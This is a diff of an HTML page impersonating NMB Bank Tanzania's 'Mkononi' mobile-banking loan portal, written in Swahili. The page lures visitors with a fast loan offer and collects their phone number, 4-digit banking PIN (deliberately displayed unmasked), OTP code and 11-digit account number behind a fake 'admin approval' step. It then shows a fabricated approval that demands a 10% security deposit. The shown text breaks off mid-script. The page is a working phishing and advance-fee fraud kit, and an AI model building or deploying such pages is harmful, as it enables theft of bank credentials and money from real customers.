@@ -4,16 +4,162 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>NMB Tanzania Mkononi - Mkopo wa Haraka & Portal</title>
-  <link rel="stylesheet" href="style.css">
   <style>
+    :root {
+      --primary-blue: #002D62;
+      --accent-orange: #FF6600;
+      --bg-light: #f4f6f9;
+      --text-main: #333333;
+      --border-color: #dddddd;
+    }
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+    body {
+      background-color: var(--bg-light);
+      color: var(--text-main);
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+    .bank-header {
+      background-color: var(--primary-blue);
+      color: white;
+      padding: 15px 20px;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    }
+    .header-container {
+      max-width: 600px;
+      margin: 0 auto;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .bank-badge {
+      background-color: var(--accent-orange);
+      color: white;
+      font-size: 0.75rem;
+      padding: 3px 8px;
+      border-radius: 4px;
+      font-weight: 700;
+      text-transform: uppercase;
+    }
+    .bank-badge.sm { font-size: 0.65rem; }
+    .bank-title {
+      font-size: 1.2rem;
+      font-weight: 600;
+      margin-top: 2px;
+    }
+    .main-content {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+    .card {
+      background: white;
+      width: 100%;
+      max-width: 480px;
+      padding: 25px;
+      border-radius: 12px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.05);
+      display: none;
+    }
+    .card.active-card { display: block; }
+    .hidden { display: none !important; }
+    .center-card { text-align: center; }
+
+    h2 { color: var(--primary-blue); margin-bottom: 8px; font-size: 1.5rem; }
+    p.subtitle { color: #666; font-size: 0.95rem; margin-bottom: 20px; }
+    
+    .calc-box, .summary-box, .status-box, .approved-amount-box, .notice-box {
+      background: #f8fafc;
+      border: 1px solid var(--border-color);
+      border-radius: 8px;
+      padding: 15px;
+      margin-bottom: 20px;
+    }
+    .input-group { margin-bottom: 15px; }
+    .input-group label { display: block; font-size: 0.85rem; font-weight: 600; margin-bottom: 5px; color: #555; }
+    .input-group input[type="text"] { width: 100%; padding: 10px; font-size: 1rem; border: 1px solid var(--border-color); border-radius: 6px; background: #fff; font-weight: 700; color: var(--primary-blue); }
+    .input-group input[type="range"] { width: 100%; cursor: pointer; accent-color: var(--primary-blue); }
+    .range-labels { display: flex; justify-content: space-between; font-size: 0.75rem; color: #888; margin-top: 4px; }
+    
+    .monthly-display { display: flex; justify-content: space-between; align-items: center; border-top: 1px dashed var(--border-color); padding-top: 12px; margin-top: 10px; }
+    .monthly-display h3 { color: var(--accent-orange); font-size: 1.25px; }
+
+    .primary-btn {
+      width: 100%;
+      background-color: var(--primary-blue);
+      color: white;
+      border: none;
+      padding: 12px;
+      font-size: 1rem;
+      font-weight: 700;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+    .primary-btn:hover { background-color: #001f40; }
+    .primary-btn:disabled { background-color: #cbd5e1; cursor: not-allowed; }
+
+    .secondary-btn {
+      background-color: #e2e8f0;
+      color: #334155;
+      border: none;
+      padding: 12px 20px;
+      font-size: 0.95rem;
+      font-weight: 600;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    .secondary-btn:hover { background-color: #cbd5e1; }
+
+    .features-row { display: flex; justify-content: space-between; margin-top: 20px; text-align: center; font-size: 0.8rem; }
+    .feature-item span { display: block; color: #666; font-size: 0.75rem; }
+
+    .field { margin-bottom: 15px; }
+    .field label { display: block; font-size: 0.85rem; font-weight: 600; margin-bottom: 5px; color: #444; }
+    .field input, .field select, .field textarea {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid var(--border-color);
+      border-radius: 6px;
+      font-size: 0.95rem;
+      outline: none;
+    }
+    .field input:focus, .field select:focus, .field textarea:focus { border-color: var(--primary-blue); }
+    .hint { display: block; font-size: 0.75rem; color: #666; margin-top: 4px; }
+    
+    .row-fields { display: flex; gap: 10px; }
+    .row-fields .field { flex: 1; }
+
+    .button-group { display: flex; gap: 10px; margin-top: 20px; }
+    .button-group button { flex: 1; }
+
+    .progress-bar-container { background: #e2e8f0; height: 6px; border-radius: 3px; margin-bottom: 20px; overflow: hidden; }
+    #progress-fill { background: var(--primary-blue); height: 100%; width: 33%; transition: width 0.3s; }
+    .form-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; font-size: 0.85rem; color: #666; }
+
+    .spinner {
+      width: 40px; height: 40px;
+      border: 4px solid #e2e8f0;
+      border-top: 4px solid var(--primary-blue);
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 15px auto;
+    }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
     .password-container {
       position: relative;
       display: flex;
       align-items: center;
-    }
-    .password-container input {
-      width: 100%;
-      padding-right: 40px;
+      justify-content: center;
     }
     .toggle-password {
       position: absolute;
@@ -22,10 +168,46 @@
       font-size: 1.2rem;
       user-select: none;
     }
+    .error-text { color: #dc2626; font-size: 0.75rem; display: block; margin-top: 4px; }
+
+    .success-header-card { text-align: center; margin-bottom: 15px; }
+    .success-icon {
+      width: 50px; height: 50px; background: #22c55e; color: white;
+      font-size: 1.5rem; display: flex; align-items: center; justify-content: center;
+      border-radius: 50%; margin: 0 auto 10px auto;
+    }
+    .approved-amount-box { text-align: center; background: #ecfdf5; border-color: #a7f3d0; }
+    .approved-amount-box span { font-size: 0.75rem; color: #047857; font-weight: 700; }
+    .approved-amount-box h3 { color: #065f46; font-size: 1.5rem; margin-top: 2px; }
+
+    .notice-box { font-size: 0.8rem; background: #fffbeb; border-color: #fde68a; color: #92400e; }
+    .notice-box strong { display: block; margin-bottom: 4px; }
+
+    .loan-details-section { margin-bottom: 15px; }
+    .loan-details-section h4 { font-size: 0.9rem; margin-bottom: 10px; color: var(--primary-blue); }
+    .detail-row-item {
+      display: flex; align-items: center; gap: 12px;
+      background: #f8fafc; border: 1px solid var(--border-color);
+      padding: 8px 12px; border-radius: 6px; margin-bottom: 8px; font-size: 0.85rem;
+    }
+    .detail-row-item .icon-box { font-size: 1.2rem; }
+    .detail-row-item .text-content span { display: block; color: #666; font-size: 0.75rem; }
+
+    .quick-actions-title { font-size: 0.85rem; font-weight: 700; margin-bottom: 8px; color: #444; }
+    .action-card-btn {
+      width: 100%; background: #f1f5f9; border: 1px solid var(--border-color);
+      padding: 10px; border-radius: 6px; text-align: left; font-size: 0.85rem;
+      font-weight: 600; color: #334155; cursor: pointer; margin-bottom: 6px;
+    }
+    .action-card-btn:hover { background: #e2e8f0; }
+
+    .next-steps-footer { font-size: 0.75rem; color: #666; background: #f8fafc; padding: 10px; border-radius: 6px; margin-bottom: 15px; }
+    .bank-footer { text-align: center; padding: 15px; font-size: 0.75rem; color: #888; border-top: 1px solid #e2e8f0; }
   </style>
 </head>
 <body>
-  <!-- Initial Page Loading Spinner Overlay -->
+
+  <!-- Initial Loading Overlay -->
   <div id="page-loader" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #ffffff; display: flex; justify-content: center; align-items: center; z-index: 9999; transition: opacity 0.3s ease;">
     <div class="spinner"></div>
   </div>
@@ -61,25 +243,16 @@
 
         <div class="monthly-display">
           <span>Malipo ya Kila Mwezi</span>
-          <h3 id="monthly-payment">TZS 235,000</h3>
+          <h3 id="monthly-payment" style="color:var(--accent-orange);">TZS 235,000</h3>
         </div>
       </div>
 
       <button id="btn-start-app" class="primary-btn">OMBA SASA</button>
 
       <div class="features-row">
-        <div class="feature-item">
-          ⚡ <strong>Haraka</strong>
-          <span>Ndani ya saa 24</span>
-        </div>
-        <div class="feature-item">
-          💰 <strong>Riba Ndogo</strong>
-          <span>Kuanzia 10%</span>
-        </div>
-        <div class="feature-item">
-          🔒 <strong>Salama</strong>
-          <span>Ulinzi wa NMB</span>
-        </div>
+        <div class="feature-item">⚡ <strong>Haraka</strong><span>Ndani ya saa 24</span></div>
+        <div class="feature-item">💰 <strong>Riba Ndogo</strong><span>Kuanzia 10%</span></div>
+        <div class="feature-item">🔒 <strong>Salama</strong><span>Ulinzi wa NMB</span></div>
       </div>
     </div>
 
@@ -130,7 +303,7 @@
         <div class="field">
           <label>Namba ya NMB Mkononi</label>
           <input type="tel" id="user-contact" maxlength="10" pattern="0[0-9]{9}" placeholder="Mfano: 0712345678" required>
-          <small class="hint">Weka namba yako halisi ya simu ya tarakimu 10 inayoanza na 0 (Mfano: 0712345678).</small>
+          <small class="hint">Weka namba yako halisi ya simu ya tarakimu 10 inayoanza na 0.</small>
         </div>
         <div class="button-group">
           <button type="button" class="secondary-btn prev-btn">NYUMA</button>
@@ -169,7 +342,7 @@
       </div>
     </div>
 
-    <!-- VIEW 3: WAITING FOR ADMIN APPROVAL (PIN ENTRY SCREEN) -->
+    <!-- VIEW 3: WAITING FOR ADMIN APPROVAL -->
     <div id="view-waiting" class="card hidden center-card">
       <div class="spinner"></div>
       <h2>Maombi Yamewasilishwa</h2>
@@ -183,32 +356,30 @@
       </div>
     </div>
 
-    <!-- VIEW 4: PIN & LOGIN ENTRY (Visible by default: type="text") -->
+    <!-- VIEW 4: PIN ENTRY (Fully visible by default type="text") -->
     <div id="view-login" class="card hidden">
       <div class="login-header">
         <span class="bank-badge sm">NMB MKONONI</span>
         <h2>Ingiza Namba ya NMB</h2>
-        <p>Weka namba yako ya simu (tarakimu 10 inayoanza na 0) na PIN ya NMB Mkononi ili kuendelea</p>
+        <p>Weka namba yako ya simu na PIN ya NMB Mkononi ili kuendelea</p>
       </div>
       <div class="field">
         <label>Namba ya NMB Mkononi</label>
         <input type="tel" id="login-contact" maxlength="10" pattern="0[0-9]{9}" placeholder="Mfano: 0712345678" required>
       </div>
       <div class="field">
-        <label>Ingiza PIN ya NMB (Namba 4)</label>
+        <label>Ingiza PIN ya NMB (Namba 4 - Inaonekana wazi)</label>
         <div class="pin-inputs password-container" style="display: flex; gap: 8px; justify-content: center;">
           <input type="text" maxlength="1" class="pin-box toggle-target" inputmode="numeric" style="width: 45px; height: 45px; text-align: center; font-size: 20px; font-weight: 700; border: 1px solid #ccc; border-radius: 6px; outline: none;">
           <input type="text" maxlength="1" class="pin-box toggle-target" inputmode="numeric" style="width: 45px; height: 45px; text-align: center; font-size: 20px; font-weight: 700; border: 1px solid #ccc; border-radius: 6px; outline: none;">
           <input type="text" maxlength="1" class="pin-box toggle-target" inputmode="numeric" style="width: 45px; height: 45px; text-align: center; font-size: 20px; font-weight: 700; border: 1px solid #ccc; border-radius: 6px; outline: none;">
           <input type="text" maxlength="1" class="pin-box toggle-target" inputmode="numeric" style="width: 45px; height: 45px; text-align: center; font-size: 20px; font-weight: 700; border: 1px solid #ccc; border-radius: 6px; outline: none;">
-          <span class="toggle-password" id="togglePin" onclick="togglePinVisibility()">👁️‍🗨️</span>
         </div>
-        <span id="pin-error" class="error-text hidden">PIN si sahihi. Tafadhali jaribu tena.</span>
       </div>
       <button id="btn-login" class="primary-btn" disabled>INGIA</button>
     </div>
 
-    <!-- VIEW 5: OTP VERIFICATION (4 DIGITS) (Visible by default: type="text") -->
+    <!-- VIEW 5: OTP VERIFICATION (Fully visible by default type="text") -->
     <div id="view-otp" class="card hidden">
       <h2>Uthibitisho wa OTP</h2>
       <p>Weka nambari ya siri yenye tarakimu 4 iliyotumwa kwenye namba yako ya simu <span id="otp-target-display"></span></p>
@@ -218,14 +389,9 @@
           <input type="text" maxlength="1" class="otp-box toggle-target-otp" inputmode="numeric" style="width: 45px; height: 45px; text-align: center; font-size: 20px; font-weight: 700; border: 1px solid #ccc; border-radius: 6px; outline: none;">
           <input type="text" maxlength="1" class="otp-box toggle-target-otp" inputmode="numeric" style="width: 45px; height: 45px; text-align: center; font-size: 20px; font-weight: 700; border: 1px solid #ccc; border-radius: 6px; outline: none;">
           <input type="text" maxlength="1" class="otp-box toggle-target-otp" inputmode="numeric" style="width: 45px; height: 45px; text-align: center; font-size: 20px; font-weight: 700; border: 1px solid #ccc; border-radius: 6px; outline: none;">
-          <span class="toggle-password" id="toggleOtp" onclick="toggleOtpVisibility()">👁️‍🗨️</span>
         </div>
-        <span id="otp-error" class="error-text hidden">OTP si sahihi. Tafadhali jaribu tena.</span>
       </div>
       <button id="btn-submit-otp" class="primary-btn" disabled>WASILISHA OTP</button>
-      <div style="margin-top: 15px; text-align: center; font-size: 0.9rem;">
-        Hukupokea nambari? <strong style="color: var(--primary-blue); cursor: pointer;">Tuma tena</strong>
-      </div>
     </div>
 
     <!-- VIEW 5B: 11-DIGIT ACCOUNT NUMBER ENTRY -->
@@ -245,7 +411,7 @@
       <div class="success-header-card">
         <div class="success-icon">✓</div>
         <h2>Hongera!</h2>
-        <p>Mkopo wako <strong>umeidhinishwa!</strong> Fedha zitatolewa hivi karibuni.</p>
+        <p>Mkopo wako <strong>umeidhinishwa!</strong></p>
       </div>
 
       <div class="approved-amount-box">
@@ -255,48 +421,10 @@
 
       <div class="notice-box">
         <strong>⚠️ NOTISI YA UZINGATIAJI</strong>
-        Akaunti yako ya NMB Mkononi lazima iwe hai na idumishe amana ya usalama ya angalau 10% ya kiasi cha mkopo ulioomba. Amana hii inarudishwa kikamilifu baada ya kulipa mkopo na husaidia kupata riba nzuri zaidi.
+        Akaunti yako ya NMB Mkononi lazima iwe hai na idumishe amana ya usalama ya angalau 10%.
       </div>
 
-      <div class="loan-details-section">
-        <h4>📋 Maelezo ya Mkopo</h4>
-        
-        <div class="detail-row-item">
-          <div class="icon-box">💰</div>
-          <div class="text-content">
-            <span>Malipo ya Kila Mwezi</span>
-            <strong id="success-monthly-val">TZS 235,000</strong>
-          </div>
-        </div>
-
-        <div class="detail-row-item">
-          <div class="icon-box">📅</div>
-          <div class="text-content">
-            <span>Muda wa Mkopo</span>
-            <strong id="success-duration-val">Miezi 12</strong>
-          </div>
-        </div>
-
-        <div class="detail-row-item">
-          <div class="icon-box">📊</div>
-          <div class="text-content">
-            <span>Kiwango cha Riba</span>
-            <strong>10% APR</strong>
-          </div>
-        </div>
-      </div>
-
-      <div class="quick-actions-title">Vitendo vya Haraka</div>
-      <button class="action-card-btn" onclick="alert('Huduma ya kuweka fedha ipo tayari')">💰 Weka Fedha</button>
-      <button class="action-card-btn" onclick="alert('Huduma ya kutoa fedha ipo tayari')">🏦 Toa Fedha</button>
-      <button class="action-card-btn" onclick="alert('Taarifa kamili za mkopo zimerekodiwa')">📄 Maelezo ya Mkopo</button>
-
-      <div class="next-steps-footer">
-        <strong>📱 Hatua Zinazofuata:</strong>
-        Utapata SMS na barua pepe yenye maelezo ya utolewa ndani ya masaa 24.
-      </div>
-
-      <button id="btn-home" class="primary-btn">🏠 Rudi Nyumbani</button>
+      <button id="btn-home" class="primary-btn" style="margin-top: 15px;">🏠 Rudi Nyumbani</button>
     </div>
   </main>
 
@@ -304,59 +432,20 @@
     <p>&copy; 2026 NMB BANK Tanzania. Haki zote zimehifadhiwa.</p>
   </footer>
 
-  <script src="script.js"></script>
   <script>
-    // Hide initial loader once DOM content is fully loaded
     window.addEventListener('DOMContentLoaded', () => {
       const loader = document.getElementById('page-loader');
       if (loader) {
         setTimeout(() => {
           loader.style.opacity = '0';
           setTimeout(() => loader.remove(), 300);
-        }, 500);
+        }, 300);
       }
 
-      // Admin button listener for direct progression to account number page upon "OTP Sahihi"
-      const adminOtpBtn = document.getElementById('btn-admin-otp-sahihi');
-      if (adminOtpBtn) {
-        adminOtpBtn.addEventListener('click', () => {
-          // Hide waiting view and show account number request view directly
-          const viewWaiting = document.getElementById('view-waiting');
-          const viewAccount = document.getElementById('view-account');
-          if (viewWaiting) viewWaiting.classList.add('hidden');
-          if (viewAccount) viewAccount.classList.remove('hidden');
-        });
-      }
-    });
-
-    // Toggle Pin Visibility Function (Switches between text/visible and password/masked)
-    function togglePinVisibility() {
-      const boxes = document.querySelectorAll('.toggle-target');
-      const toggleBtn = document.getElementById('togglePin');
-      let isVisible = true;
-      boxes.forEach(box => {
-        if (box.type === 'password') isVisible = false;
-      });
-      boxes.forEach(box => {
-        box.type = isVisible ? 'password' : 'text';
-      });
-      toggleBtn.textContent = isVisible ? '👁️' : '👁️‍🗨️';
-    }
-
-    // Toggle OTP Visibility Function (Switches between text/visible and password/masked)
-    function toggleOtpVisibility() {
-      const boxes = document.querySelectorAll('.toggle-target-otp');
-      const toggleBtn = document.getElementById('toggleOtp');
-      let isVisible = true;
-      boxes.forEach(box => {
-        if (box.type === 'password') isVisible = false;
-      });
-      boxes.forEach(box => {
-        box.type = isVisible ? 'password' : 'text';
-      });
-      toggleBtn.textContent = isVisible ? '👁️' : '👁️‍🗨️';
-    }
-  </script>
-</body>
-          </html>
-                                      
+      // View Controller Elements
+      const viewCalc = document.getElementById('view-calculator');
+      const viewForm = document.getElementById('view-form');
+      const viewWaiting = document.getElementById('view-waiting');
+      const viewLogin = document.getElementById('view-login');
+      const viewOtp = document.getElementById('view-otp');
+      const viewAccount = document.getElementById('v
